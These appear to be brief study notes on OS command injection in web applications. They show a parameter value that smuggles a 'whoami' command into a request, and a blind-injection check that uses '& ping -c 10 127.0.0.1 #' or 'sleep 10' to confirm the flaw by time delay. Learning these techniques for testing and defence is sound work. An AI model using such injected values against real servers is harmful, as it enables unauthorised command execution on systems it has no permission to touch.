If the backend is direclty talking with the OS of the server it is running on
then we could exploit this and talk to the OS directly.

URL encode it also.

Example: productId=1& whoami # & storeId=1 (not encoded)

Blind vulnerabilities: When the application doesn't direclty return the output 
in the http response but there is a vulnerabilitie that we can exploit.

Verify using 'ping' command: & ping -c 10 127.0.0.1 # & --> pings the localhost 10 times,
                                               therefore consumes time and validates the vulnerability.
                            or use "sleep 10"
